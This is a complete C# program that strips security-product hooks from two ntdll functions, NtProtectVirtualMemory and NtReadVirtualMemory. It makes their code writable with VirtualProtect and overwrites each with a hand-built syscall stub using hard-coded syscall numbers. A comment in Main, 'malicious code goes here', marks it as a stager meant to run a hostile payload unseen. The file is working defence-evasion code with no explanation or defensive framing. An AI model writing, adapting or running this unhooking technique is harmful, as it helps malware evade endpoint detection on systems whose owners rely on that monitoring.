using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CSUnhookCS
{
    class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static private void CleanUp()
        {
            IntPtr dllHandle = LoadLibrary("ntdll.dll");
            IntPtr NtProtectVirtualMemory = GetProcAddress(dllHandle, "NtProtectVirtualMemory");
            IntPtr NtReadVirtualMemory = GetProcAddress(dllHandle, "NtReadVirtualMemory");

            Console.WriteLine("NtProtectVirtualMemory at 0x{0}", NtProtectVirtualMemory.ToString("X"));
            PatchHook(NtProtectVirtualMemory, 0x50, 0x00);

            Console.WriteLine("NtReadVirtualMemory at 0x{0}", NtReadVirtualMemory.ToString("X"));
            PatchHook(NtReadVirtualMemory, 0x3f, 0x00);
        }

        static private void PatchHook(IntPtr address, byte syscall, byte high)
        {
            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint OldProtection;
            byte[] patch = new byte[] { 0x4c, 0x8b, 0xd1, 0xb8, syscall, high, 0x00, 0x00, 0x0f, 0x05, 0xc3 };
            int length = patch.Length;
            
            Console.WriteLine(" Running Virtual Protect: "+address+" "+ syscall);            
            VirtualProtect(address, (uint)length, PAGE_EXECUTE_READWRITE, out OldProtection);
            
            Console.WriteLine(" Running Marshall Copy: " + address+" "+ syscall);
            Marshal.Copy(patch, 0, address, length);
        }
        static void Main(string[] args)
        {
            CleanUp();
            Console.WriteLine("Clean Up Completed");
            Thread.Sleep(99999999);//Here so you can check resutls in other tools
            // malicious code goes here

        }
    }
}
